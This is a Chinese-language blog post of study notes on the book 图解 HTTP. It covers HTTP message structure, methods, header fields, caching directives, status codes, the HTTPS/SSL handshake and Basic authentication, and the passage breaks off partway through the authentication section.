<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 图解 HTTP · senyu's blog</title><meta name="description" content="图解 HTTP - senyu"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="senyu's blog"><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="senyu's blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">图解 HTTP</h1><div class="post-info">Mar 30, 2020</div><div class="post-content"><h2 id="图解-HTTP-知识点"><a href="#图解-HTTP-知识点" class="headerlink" title="图解 HTTP 知识点"></a>图解 HTTP 知识点</h2><h3 id="Web-和网络基础"><a href="#Web-和网络基础" class="headerlink" title="Web 和网络基础"></a>Web 和网络基础</h3><ol>
<li><p>绝对 URI 的格式。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://user:pass@www.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure>

<ul>
<li><code>http://</code>：协议方案名</li>
<li><code>user:pass</code>：登录信息（认证）</li>
<li><code>www.example.com</code>：服务器地址</li>
<li><code>80</code>：端口号</li>
<li><code>/dir/index.html</code>：带层次的文件路径，也就是请求 URI</li>
<li><code>uid=1</code>：查询字符串</li>
<li><code>ch1</code>：片段标识符</li>
</ul>
</li>
</ol>
<h3 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h3><ol>
<li><p>请求报文的构成：</p>
<p>请求行分别为 方法、URI、协议版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;form&#x2F;entry HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p>接下来是请求首部字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: hackr.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br></pre></td></tr></table></figure>

<p>空一行分隔（CR+LF），内容实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;ueno&amp;age&#x3D;37</span><br></pre></td></tr></table></figure>
</li>
<li><p>响应报文的构成：</p>
<p>状态行分别为 协议版本、状态码、状态码的原因短语</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>

<p>接下来是响应首部字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text&#x2F;html</span><br></pre></td></tr></table></figure>

<p>空一行分隔（CR+LF），然后是内容主体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTP/1.1 中可使用的方法</p>
<ol>
<li><strong>GET</strong> : 获取资源。</li>
<li><strong>POST</strong> : 传输实体主体。</li>
<li><strong>PUT</strong> : 传输文件。不带检验机制。</li>
<li><strong>HEAD</strong> : 获得报文首部。和 GET 一样，只是不返回主体，用于确认 URI 的有效性及资源更新的日期时间等</li>
<li><strong>DELETE</strong> : 删除文件。与 PUT 相反。</li>
<li><strong>OPTIONS</strong> : 询问支持的 HTTP 方法。</li>
<li><strong>TRACE</strong> : 追踪路径，让 Web 服务器将之前的请求通信环回给客户端。</li>
<li><strong>CONNECT</strong> : 要求用隧道协议连接代理。使用 SSL 和 TLS 协议加密通信内容后传输。</li>
</ol>
<p>另外 <strong>LINK</strong> 和 <strong>UNLINK</strong> 方法在 HTTP/1.1 被废弃。</p>
</li>
<li><p>HTTP /1.1 首部字段（47 种）一览：</p>
<ol>
<li><p>通用首部字段</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Cache-Control</td>
<td>控制缓存的行为</td>
</tr>
<tr>
<td>Connection</td>
<td>逐跳首部、连接的管理</td>
</tr>
<tr>
<td>Date</td>
<td>创建报文的日期时间</td>
</tr>
<tr>
<td>Pragma</td>
<td>报文指令</td>
</tr>
<tr>
<td>Trailer</td>
<td>报文末端的首部一览</td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td>指定报文主体的传输编码方式</td>
</tr>
<tr>
<td>Upgrade</td>
<td>升级为其他协议</td>
</tr>
<tr>
<td>Via</td>
<td>代理服务器的相关信息</td>
</tr>
<tr>
<td>Warning</td>
<td>错误通知</td>
</tr>
</tbody></table>
</li>
<li><p>请求首部字段</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>用户代理可处理的媒体类型</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>优先的字符集</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>优先的内容编码</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>优先的语言（自然语言）</td>
</tr>
<tr>
<td>Authorization</td>
<td>Web 认证信息</td>
</tr>
<tr>
<td>Expect</td>
<td>期待服务器的特定行为</td>
</tr>
<tr>
<td>From</td>
<td>用户的电子邮箱地址</td>
</tr>
<tr>
<td>Host</td>
<td>请求资源所在的服务器</td>
</tr>
<tr>
<td>If-Match</td>
<td>比较实体标记（ETag）</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>比较资源的更新时间</td>
</tr>
<tr>
<td>If-Range</td>
<td>资源未更新时发送实体 Byte 的范围请求</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>比较资源的更新时间（与 If-Modified-Since 相反）</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>最大传输逐跳数</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td>Range</td>
<td>实体的字节请求范围</td>
</tr>
<tr>
<td>Referer</td>
<td>对请求中 URI 的原始获取方</td>
</tr>
<tr>
<td>TE</td>
<td>传输编码的优先级</td>
</tr>
<tr>
<td>User-Agent</td>
<td>HTTP 客户端程序的信息</td>
</tr>
</tbody></table>
</li>
<li><p>响应首部字段</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Accept-Ranges</td>
<td>是否可接受字节的范围请求</td>
</tr>
<tr>
<td>Age</td>
<td>推算资源创建经过的时间</td>
</tr>
<tr>
<td>ETag</td>
<td>资源的匹配信息</td>
</tr>
<tr>
<td>Location</td>
<td>令客户端重定向至指定 URI</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td>Retry-After</td>
<td>对再次发起请求的时机要求</td>
</tr>
<tr>
<td>Server</td>
<td>HTTP 服务器的安装信息</td>
</tr>
<tr>
<td>Vary</td>
<td>代理服务器缓存的管理信息</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>服务器对客户端的认证信息</td>
</tr>
</tbody></table>
</li>
<li><p>实体首部字段</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Allow</td>
<td>资源可支持的 HTTP 方法</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>实体主体使用的编码方式</td>
</tr>
<tr>
<td>Content-Language</td>
<td>实体主体的自然语言</td>
</tr>
<tr>
<td>Content-Length</td>
<td>实体主体的大小</td>
</tr>
<tr>
<td>Content-Location</td>
<td>替代对应的资源的 URI</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>实体主体的报文摘要</td>
</tr>
<tr>
<td>Content-Range</td>
<td>实体主体的位置范围</td>
</tr>
<tr>
<td>Expires</td>
<td>实体主体过期的日期时间</td>
</tr>
<tr>
<td>Last-Modified</td>
<td>资源的最后修改日期时间</td>
</tr>
</tbody></table>
</li>
</ol>
<h5 id="注：还有其他-RFC-2616-外定义的首部字段，如-Cookie，Set-Cookie-和-Content-Disposition-等也是会经常用到。"><a href="#注：还有其他-RFC-2616-外定义的首部字段，如-Cookie，Set-Cookie-和-Content-Disposition-等也是会经常用到。" class="headerlink" title="注：还有其他 RFC 2616 外定义的首部字段，如 Cookie，Set-Cookie 和 Content-Disposition 等也是会经常用到。"></a>注：还有其他 RFC 2616 外定义的首部字段，如 Cookie，Set-Cookie 和 Content-Disposition 等也是会经常用到。</h5></li>
<li><p>End-to-end 首部和 Hop-by-hop 首部（是否缓存代理）</p>
<p>除以下 8 个首部字段之外，其他所有字段都属于端到端首部</p>
<ul>
<li><strong>Connection</strong></li>
<li><strong>Keep-Alive</strong></li>
<li><strong>Proxy-Authenticate</strong></li>
<li><strong>Proxy-Authorization</strong></li>
<li><strong>Trailer</strong></li>
<li><strong>TE</strong></li>
<li><strong>Transfer-Encoding</strong></li>
<li><strong>Upgrade</strong></li>
</ul>
</li>
</ol>
<h3 id="HTTP-1-1-通用首部字段详解"><a href="#HTTP-1-1-通用首部字段详解" class="headerlink" title="HTTP /1.1 通用首部字段详解"></a>HTTP /1.1 通用首部字段详解</h3><ol>
<li><p><strong>Cache-Control</strong> 控制缓存的行为，指令的参数是可选的，通过“,”分隔。</p>
<ul>
<li><p>缓存请求指令</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>no-cache</td>
<td>无</td>
<td>强制向源服务器再次验证</td>
</tr>
<tr>
<td>no-store</td>
<td>无</td>
<td>不缓存请求或响应的任何内容</td>
</tr>
<tr>
<td>max-age=[秒]</td>
<td>必需</td>
<td>响应的最大Age值</td>
</tr>
<tr>
<td>max-stale(=[秒])</td>
<td>可省略</td>
<td>接收已过期的响应</td>
</tr>
<tr>
<td>min-fresh=[秒]</td>
<td>必需</td>
<td>期望在指定时间内的响应仍有效</td>
</tr>
<tr>
<td>no-transform</td>
<td>无</td>
<td>代理不可更改媒体类型</td>
</tr>
<tr>
<td>only-if-cached</td>
<td>无</td>
<td>从缓存获取资源</td>
</tr>
<tr>
<td>cache-extension</td>
<td>-</td>
<td>新指令标记（token）</td>
</tr>
</tbody></table>
</li>
<li><p>缓存响应指令</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>无</td>
<td>可向任意方提供响应的缓存</td>
</tr>
<tr>
<td>private</td>
<td>可省略</td>
<td>仅向特定用户返回响应</td>
</tr>
<tr>
<td>no-cache</td>
<td>可省略</td>
<td>缓存前必须先确认其有效性</td>
</tr>
<tr>
<td>no-store</td>
<td>无</td>
<td>不缓存请求或响应的任何内容</td>
</tr>
<tr>
<td>no-transform</td>
<td>无</td>
<td>代理不可更改的媒体类型</td>
</tr>
<tr>
<td>must-revalidate</td>
<td>无</td>
<td>可缓存但必须再向源服务器进行确认</td>
</tr>
<tr>
<td>proxy-revalidate</td>
<td>无</td>
<td>要求中间缓存服务器对缓存的响应有效性再进行确认</td>
</tr>
<tr>
<td>max-age = [秒]</td>
<td>必需</td>
<td>响应的最大Age值</td>
</tr>
<tr>
<td>s-maxage = [秒]</td>
<td>必需</td>
<td>公共缓存服务器响应的最大Age值</td>
</tr>
<tr>
<td>cache-extension</td>
<td>-</td>
<td>新指令标记（token）</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p><strong>Connection</strong> 具备两个作用：</p>
<ul>
<li><p>控制不再转发给代理的首部字段</p>
</li>
<li><p>管理持久连接：</p>
<p>HTTP /1.1 版本的默认连接都是持久连接（Keep-Alive），当服务端想明确断开连接时，指定其值为 Close。</p>
</li>
</ul>
</li>
<li><p><strong>Pragma</strong> 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0 的向后兼容而定义。只用在客户端发送请求，要求所有的中间服务器不返回缓存的资源。形式唯一：<code>Pragma: no-cache</code></p>
</li>
<li><p><strong>Trailer</strong> 会实现说明在报文主体后记录了哪些首部字段，可应用在 HTTP/1.1 版本分块传输编码时。</p>
</li>
<li><p><strong>Transfer-Encoding</strong> 规定了传输报文主体时采用的编码方式。</p>
</li>
<li><p><strong>Upgrade</strong> 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定 Connection:Upgrade。</p>
</li>
<li><p><strong>Via</strong> 是为了追踪客户端和服务器之间的请求和响应报文的传输路径，配合 TRACE 方法使用。</p>
</li>
<li><p><strong>Warning</strong> 会告知用户一些与缓存相关的问题和警告，格式如下：</p>
<p><code>Warning: [警告码][警告的主机:端口号]&quot;[警告内容]&quot;([日期时间])</code></p>
<p>HTTP /1.1 定义了 7 种警告码：</p>
<table>
<thead>
<tr>
<th align="center">警告码</th>
<th>警告内容</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">110</td>
<td>Response is stale (响应已过期)</td>
<td>代理返回已过期的资源</td>
</tr>
<tr>
<td align="center">111</td>
<td>Revalidation failed (再验证失败)</td>
<td>代理再验证资源有效性时失败(服务 器无法到达等原因)</td>
</tr>
<tr>
<td align="center">112</td>
<td>Disconnection operation(断开连接操作)</td>
<td>代理与互联网连接被故意切断</td>
</tr>
<tr>
<td align="center">113</td>
<td>Heuristic expiration (试探性过期)</td>
<td>响应的使用期超过24小时(有效缓存 的设定时间大于24小时的情况下)</td>
</tr>
<tr>
<td align="center">199</td>
<td>Miscellaneous warning (杂项警告)</td>
<td>任意的警告内容</td>
</tr>
<tr>
<td align="center">214</td>
<td>Transformation applied (使用了转换)</td>
<td>代理对内容编码或媒体类型等执行了 某些处理时</td>
</tr>
<tr>
<td align="center">299</td>
<td>Miscellaneous persistent warning(持久杂项警告)</td>
<td>任意的警告内容</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="HTTP-1-1-请求首部字段详解"><a href="#HTTP-1-1-请求首部字段详解" class="headerlink" title="HTTP /1.1 请求首部字段详解"></a>HTTP /1.1 请求首部字段详解</h3><ol>
<li><p><strong>Accept</strong> 通知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级。例如：</p>
<ul>
<li><p>文本文件</p>
<p>text/html, text/plain, text/css … </p>
<p>application/xhtml+xml, application/xml … </p>
</li>
<li><p>图片文件<br> image/jpeg, image/gif, image/png … </p>
</li>
<li><p>视频文件</p>
<p>video/mpeg, video/quicktime …</p>
</li>
<li><p>应用程序使用的二进制文件</p>
<p>application/octet-stream, application/zip …</p>
</li>
</ul>
<p>若想要给显示的媒体类型增加优先级，则使用 <code>q=</code> 来额外表示权重值，用”;”进行分隔，范围0~1，可精确到小数点后3位，1为最大值和默认值。</p>
</li>
<li><p><strong>Accept-Charset</strong> 通知服务器用户代理支持的字符集及其优先顺序。</p>
</li>
<li><p><strong>Accept-Encoding</strong> 告知服务器用户代理支持的内容编码及优先级顺序，常用编码有：</p>
<ul>
<li>gzip（GNU zip）</li>
<li>compress（UNIX 系统的标准压缩）</li>
<li>deflate（zlib）</li>
<li>Identity（不进行编码）</li>
</ul>
<p>权重也是采用 q 值表示优先级。也可以使用“*”作为通配符。</p>
</li>
<li><p><strong>Accept-Language</strong> 告知服务器用户代理能够处理的自然语言集。</p>
</li>
<li><p><strong>Authorization</strong> 用来告知服务器用户代理的认证信息。通常是在返回 401 状态码响应后，把首部字段 Authorization 加入请求中。</p>
</li>
<li><p><strong>Expect</strong> 客户端用来告知服务器期望出现的某种特定行为。服务器无理解客户端的期望而发生错误时，会返回 417 Expectation Failed。</p>
</li>
<li><p><strong>From</strong> 用来告知服务器使用用户代理的电子邮件地址，目的是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。</p>
</li>
<li><p><strong>Host</strong> 会告知服务器请求的资源所处的互联网主机名和端口号，是 HTTP /1.1 规范内唯一一个必须被包含在请求内的首部字段。</p>
</li>
<li><p><strong>If-Match</strong> 条件请求，指定条件为真时，才会执行请求。</p>
</li>
<li><p><strong>If-Modified-Since</strong> 如果在指定的日期时间后，资源发生了更新，服务器就会接受请求。</p>
</li>
<li><p><strong>If-None-Match</strong> 和 If-Match 作用相反。</p>
</li>
<li><p><strong>If-Range</strong> 若指定的字段值和请求资源的一致时，则作为范围请求处理。相当于 If-Match 和 Range 两次处理</p>
</li>
<li><p><strong>If-Unmodified-Since</strong> 和 If-Modified-Since 的作用相反。</p>
</li>
<li><p><strong>Max-Forwards</strong> 通过 TRACE 和 OPTIONS 方法，表示以十进制证书形式指定可经过的服务器最大数目，在往下一个服务器转发请求前会减 1 后重新赋值。</p>
</li>
<li><p><strong>Proxy-Authorization</strong> 告知服务器认证所需要的信息。</p>
</li>
<li><p><strong>Range</strong> 告知服务器资源的指定范围。</p>
</li>
<li><p><strong>Referer</strong> 告知服务器请求的原始资源的 URI。</p>
</li>
<li><p><strong>TE</strong> 告知服务器能够处理响应的传输编码方式及其优先级。与 Accept-Encoding 的功能很像，但是用于传输编码。</p>
</li>
<li><p><strong>User-Agent</strong> 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p>
</li>
</ol>
<h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><ol>
<li><strong>Accept-Ranges</strong> 用来告知客户端服务器是否能处理范围请求。可处理时指定其为 bytes，反之为 none。</li>
<li><strong>Age</strong> 告知客户端源服务器在多久前创建了响应。字段值的单位为秒。</li>
<li><strong>ETag</strong> 能告知客户端实体标示。是一种可将资源以字符串形式做唯一性标识的方式。没有统一的算法规则，仅仅由服务器来分配。ETag 中有强 ETag 值和弱 ETag 值之分，强 ETag 值不论实体发生多么细微的变化都会改变其值；弱 ETag 值只用于提示资源是否相同，只有资源发生根本变化才会改变。弱 ETag 会在字符值最开始处附加 W/。</li>
<li><strong>Location</strong> 可以将响应接收方引导至某个与请求 URI 位置不同的资源，通常会配合 3xx 的响应。</li>
<li><strong>Proxy-Authenticate</strong> 会把由代理服务器所要求的认证信息发送给客户端。</li>
<li><strong>Retry-After</strong> 告知客户端应该在多久之后再次发送请求。主要配合 503 Service Unavailable 或 3xx 响应。</li>
<li><strong>Server</strong> 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。</li>
<li><strong>Vary</strong> 可对缓存进行控制，源服务器会向代理服务器传达关于本地缓存使用方法的命令。</li>
<li><strong>WWW-Authenticate</strong> 用于 HTTP 访问认证。会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或 Digest） 和带参数提示的质询（Challenge）。</li>
</ol>
<h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><ol>
<li><strong>Allow</strong> 用于通知客户端能够支持的 Request-URI 指定资源的所有 HTTP 方法。当接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。</li>
<li><strong>Content-Encoding</strong> 会告知客户端服务器对实体的主体部分选用的内容编码方式。</li>
<li><strong>Content-Language</strong> 会告知客户端实体主体使用的自然语言。</li>
<li><strong>Content-Length</strong> 表明了实体主体部分的大小。对实体主体进行内容编码传输时，不能再使用。</li>
<li><strong>Content-Location</strong> 给出与报文主体部分相对应的 URI。</li>
<li><strong>Content-MD5</strong>  客户端会对接收的报文主体执行相同的 MD5 算法，然后与此字段值比较。对报文主体执行 MD5 算法获得的 128 位二进制数（32个字符），再通过 Base64 编码的借口就是此字段值。</li>
<li><strong>Content-Range</strong> 针对范围请求，告知客户端作为响应返回的实体和那个部分符合范围请求，单位字节。</li>
<li><strong>Content-Type</strong> 说明了实体主体内对象的媒体类型。</li>
<li><strong>Expires</strong> 会将资源失效的日期告知客户端。当首部的 Cache-Control 有 max-age 指令时会优先处理。</li>
<li><strong>Last-Modified</strong> 指明资源最终修改的时间。</li>
</ol>
<h3 id="为-Cookie-服务的字段"><a href="#为-Cookie-服务的字段" class="headerlink" title="为 Cookie 服务的字段"></a>为 Cookie 服务的字段</h3><ol>
<li><p><strong>Set-Cookie</strong> 开始管理客户端的状态时，会事先告知使用的 Cookie 信息。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NAME=VALUE</td>
<td>赋予 Cookie 的名称和其值（必需项）</td>
</tr>
<tr>
<td>expires=DATE</td>
<td>Cookie 的有效期（若不指明则默认为浏览器关闭前为止）</td>
</tr>
<tr>
<td>path=PATH</td>
<td>将服务器上的文件目录作为 Cookie 的使用对象（若不指定则默认为文档所在的文件目录）</td>
</tr>
<tr>
<td>domain=域名</td>
<td>作为 Cookie 使用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td>
</tr>
<tr>
<td>Secure</td>
<td>仅在 HTTPS 安全通信时才会发送 Cookie</td>
</tr>
<tr>
<td>HttpOnly</td>
<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>
</tr>
</tbody></table>
</li>
<li><p><strong>Cookie</strong> 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。</p>
</li>
</ol>
<h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><ol>
<li><p><strong>X-Frame-Options</strong> 属于 HTTP 响应首部，控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。主要目的是为了防止点击劫持攻击。有以下两个可指定的字段值。</p>
<ul>
<li><p><strong>DENY</strong>：拒绝</p>
</li>
<li><p><strong>SAMEORIGIN</strong>：仅同源域名下的页面匹配时许可。</p>
</li>
</ul>
</li>
<li><p><strong>X-XSS-Protection</strong> 属于 HTTP 响应首部，针对跨站脚本攻击的一种对策，用于控制浏览器 XSS 防护机制的开关。可指定的值：</p>
<ul>
<li><p><strong>0</strong> ：将 XSS 过滤设置成无效状态</p>
</li>
<li><p><strong>1</strong> ：将 XSS 过滤设置成有效状态</p>
</li>
</ul>
</li>
<li><p><strong>DNT</strong> 属于 HTTP 请求首部，为 Do Not Track 的简称，意为拒绝个人信息被收集，是标示拒绝被精准广告追踪的一种方法。可指定的值：</p>
<ul>
<li><p><strong>0</strong> ：同意被追踪</p>
</li>
<li><p><strong>1</strong> ：拒绝被追踪</p>
</li>
</ul>
</li>
<li><p><strong>P3P</strong> 属于 HTTP 响应首部，通过利用 P3P (The Platform for Privacy Preferences，在线隐私偏好平台) 技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。需按以下操作步骤：</p>
<p>步骤 <strong>1</strong>：创建 P3P 隐私</p>
<p>步骤 <strong>2</strong>：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml</p>
<p>步骤 <strong>3</strong>：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应 中</p>
</li>
</ol>
<h3 id="HTTP-状态"><a href="#HTTP-状态" class="headerlink" title="HTTP 状态"></a>HTTP 状态</h3><ol>
<li>状态码的类型：</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>类别</th>
<th>原因短语</th>
</tr>
</thead>
<tbody><tr>
<td>1XX</td>
<td>Informational（信息性状态码）</td>
<td>接收的请求正在处理</td>
</tr>
<tr>
<td>2XX</td>
<td>Success（成功状态码）</td>
<td>请求正常处理完毕</td>
</tr>
<tr>
<td>3XX</td>
<td>Redirection（重定向状态码）</td>
<td>需要进行附加操作以完成请求</td>
</tr>
<tr>
<td>4XX</td>
<td>Client Error（客户端错误状态码）</td>
<td>服务器无法处理请求</td>
</tr>
<tr>
<td>5XX</td>
<td>Server Error（服务器错误状态码）</td>
<td>服务器处理请求出错</td>
</tr>
</tbody></table>
<ol start="2">
<li><p><strong>2XX</strong> 成功</p>
<ol>
<li><strong>200 OK</strong>：正常处理</li>
<li><strong>204 No Content</strong>：已成功处理，但返回的响应报文中不含实体的主体部分。</li>
<li><strong>206 Partial Content</strong> ：服务器成功执行了范围请求。</li>
</ol>
</li>
<li><p><strong>3XX</strong> 重定向</p>
<ol>
<li><strong>301 Moved Permanently</strong>：永久性重定向</li>
<li><strong>302 Found</strong>：临时性重定向，POST 会变成 GET</li>
<li><strong>303 See Other</strong>：表示资源存在着另一个 URI，并希望客户端使用 GET 方式定向获取资源</li>
<li><strong>304 Not Modified</strong>：客户端发送附带条件的请求，服务器端允许请求访问资源但未满足条件</li>
<li><strong>307 Temporary Redirect</strong>：临时重定向，不会把 POST 变换成 GET</li>
</ol>
<h5 id="注：HTTP-1-1-中使用-303-和-307-来细化-302-重定向的行为。"><a href="#注：HTTP-1-1-中使用-303-和-307-来细化-302-重定向的行为。" class="headerlink" title="注：HTTP 1.1 中使用 303 和 307 来细化 302 重定向的行为。"></a>注：HTTP 1.1 中使用 303 和 307 来细化 302 重定向的行为。</h5></li>
<li><p><strong>4XX</strong> 客户端错误</p>
<ol>
<li><strong>400 Bad Request</strong>：请求报文中存在语法错误</li>
<li><strong>401 Unauthorized</strong>：表示发送请求需要有通过 HTTP 认证（浏览器弹窗输入密码）</li>
<li><strong>403 Forbidden</strong>：请求资源的访问被服务器拒绝了</li>
<li><strong>404 Not Found</strong>：服务器上无法找到请求的资源（或者拒绝请求且不想说明原因）</li>
</ol>
</li>
<li><p><strong>5XX</strong> 服务器错误</p>
<ol>
<li><strong>500 Internal Server Error</strong>：服务端在执行请求时发生错误</li>
<li><strong>503 Service Unavailable</strong>：服务器暂时处于超负荷或正在进行停机维，无法处理请求</li>
</ol>
</li>
</ol>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><ol>
<li><p>HTTP 的缺点：</p>
<ul>
<li>通信使用明文（不加密），内容可能会被窃听。（内容泄漏）</li>
<li>不验证通信方的身份，因此有可能遭遇伪装。（Dos 攻击）</li>
<li>无法验证报文的完整性，所以有可能已遭篡改。（MITM 攻击）</li>
</ul>
<p>即：HTTP + 加密 + 认证 + 完整性保护 = HTTPS</p>
</li>
<li><p>SSL</p>
<ul>
<li>SSL 是独立于 HTTP 的协议，使用 SSL 时，先和 SSL 通信，再由 SSL 和 TCP 通信。</li>
<li>SSL 采用公开密钥加密的非对称加密处理方式，发送方使用公钥进行加密，接收方使用私钥进行解密。</li>
<li>EV SSL 证书可确认对方服务器背后运营的企业是否真实存在。</li>
<li>使用 OpenSSL 的开源程序，可以构建一套属于自己的认证机构，给自己的服务器颁发证书。浏览器访问时，会显示无法确认连接安全性等警告消息。</li>
<li>HTTPS 比 HTTP 慢 2 到 100 倍，SSL 的慢一种是通信慢，另一种是指由于大量消耗 CPU 等资源导致处理速度变慢。</li>
</ul>
</li>
<li><p>HTTPS 工作流程</p>
<ol>
<li>客户端通过发送 <code>Client Hello</code> 报文开始 SSL 通信。报文中包 含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</li>
<li>服务器可进行 SSL 通信时，会以 <code>Server Hello</code> 报文作为应答。</li>
<li>之后服务器发送 <code>Certificate</code> 报文。报文中包含公开密钥证书。</li>
<li>服务器发送 <code>Server Hello Done</code> 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</li>
<li>SSL 第一次握手结束之后，客户端以 <code>Client Key Exchange</code> 报文作为回应。报文中包含通信加密中使用的一种被称为 <code>Pre-master secret</code> 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</li>
<li>接着客户端继续发送 <code>Change Cipher Spec</code> 报文。</li>
<li>客户端发送 <code>Finished</code> 报文。该报文包含连接至今全部报文的整体校验值。</li>
<li>服务器同样发送 <code>Change Cipher Spec</code> 报文。</li>
<li>服务器同样发送 <code>Finished</code> 报文。</li>
<li>服务器和客户端的 <code>Finished</code> 报文交换完毕之后，SSL 连接就算建立完成。</li>
<li>应用层协议通信，即发送 HTTP 响应。</li>
<li>最后由客户端断开连接。断开连接时，发送 <code>close_notify</code> 报文。</li>
</ol>
<p>在以上流程中，应用层发送数据时会附加一种叫做 MAC(Message Authentication Code)的报文摘要。MAC 能够查知报文是否遭到篡 改，从而保护报文的完整性。</p>
</li>
</ol>
<h3 id="HTTP-1-1-使用的认证方式"><a href="#HTTP-1-1-使用的认证方式" class="headerlink" title="HTTP/1.1 使用的认证方式"></a>HTTP/1.1 使用的认证方式</h3><ul>
<li><p>BASIC 认证（基本认证）：</p>
<ol>
<li>当请求的资源需要认证时，服务器会随状态码 <strong>401 Authorization Required</strong>，返回带 <strong>WWW-Authenticate</strong> 首部字段的响应。该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 (realm)。</li>
<li>接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户信息发送给服务器，信息中间以冒号(:)连接后，再经过 Base64 编码处理。</li>
<li>接收到包含首部字段 <strong>Authorization</strong> 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。</li>
</ol>
